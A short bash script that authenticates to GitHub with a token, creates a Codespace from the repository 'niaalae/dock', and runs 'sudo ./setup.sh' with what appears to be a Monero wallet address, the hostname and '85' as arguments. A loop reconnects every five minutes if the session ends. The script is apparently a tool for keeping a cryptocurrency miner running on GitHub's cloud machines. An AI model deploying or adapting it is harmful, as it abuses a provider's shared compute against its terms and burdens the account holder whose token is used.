#!/bin/bash

GH_TOKEN="$1"
REPO="niaalae/dock"
BRANCH="main"
MACHINE_TYPE="basicLinux_4x16" # Change if you have a better type
SETUP_CMD='sudo ./setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F "$(hostname)" 85'

if [ -z "$GH_TOKEN" ]; then
  echo "Usage: $0 <gh_token>"
  exit 1
fi

# Authenticate
echo "$GH_TOKEN" | gh auth login --with-token
if [ $? -ne 0 ]; then
  echo "GitHub authentication failed."
  exit 1
fi

# Create codespace
CODESPACE_NAME=$(gh codespace create -R "$REPO" -b "$BRANCH" -m "$MACHINE_TYPE" --json name -q ".name")
if [ -z "$CODESPACE_NAME" ]; then
  echo "Failed to create codespace."
  exit 1
fi
echo "Created codespace: $CODESPACE_NAME"

# SSH and run setup command in background
ssh_cmd="gh codespace ssh -c $CODESPACE_NAME -- $SETUP_CMD"
$ssh_cmd &
SSH_PID=$!

while true; do
  sleep 300 # 5 minutes
  if ! kill -0 $SSH_PID 2>/dev/null; then
    echo "SSH session closed. Attempting to reconnect..."
    # Check if codespace exists
    EXISTS=$(gh codespace list --json name -q ".[] | select(.name==\"$CODESPACE_NAME\") | .name")
    if [ -z "$EXISTS" ]; then
      echo "Codespace not found. Checking token validity..."
      gh auth status
      if [ $? -ne 0 ]; then
        echo "GitHub token invalid. Exiting."
        exit 1
      fi
      echo "Codespace missing but token valid. Exiting."
      exit 1
    fi
    # Reconnect SSH
    $ssh_cmd &
    SSH_PID=$!
  fi
done